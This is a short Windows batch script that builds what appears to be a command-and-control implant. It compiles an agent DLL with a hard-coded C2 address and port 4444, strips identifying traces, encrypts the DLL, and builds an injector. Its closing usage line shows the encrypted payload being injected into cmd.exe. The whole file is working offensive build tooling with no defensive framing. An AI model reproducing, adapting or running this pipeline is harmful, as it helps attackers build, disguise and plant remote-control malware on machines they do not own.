@echo off
set IP=192.168.102.167
set PORT=4444
if not "%1"=="" set IP=%1
if not "%2"=="" set PORT=%2
for /f "usebackq" %%i in (`powershell -c "$b=[Net.IPAddress]::Parse('%IP%').GetAddressBytes();'0x{0:X8}' -f ($b[0] -bor ($b[1] -shl 8) -bor ($b[2] -shl 16) -bor ($b[3] -shl 24))"`) do set IPHEX=%%i
echo C2: %IP%:%PORT%
gcc -O2 -s -m64 -shared -fno-ident -DC2_IP=%IPHEX% -DC2_PORT=%PORT% -o agent.dll agent.c -lws2_32 || goto :err
echo [1/4] agent.dll
gcc -O2 -s -m64 -fno-ident -o encrypt.exe encrypt.c || goto :err
echo [2/4] encrypt.exe
encrypt.exe agent.dll
echo [3/4] agent.dll.enc
gcc -O2 -s -m64 -fno-ident -o injector_enc.exe injector_enc.c || goto :err
echo [4/4] injector_enc.exe
echo Done! Use: injector_enc.exe agent.dll.enc cmd.exe
goto :end
:err
echo Build failed!
:end
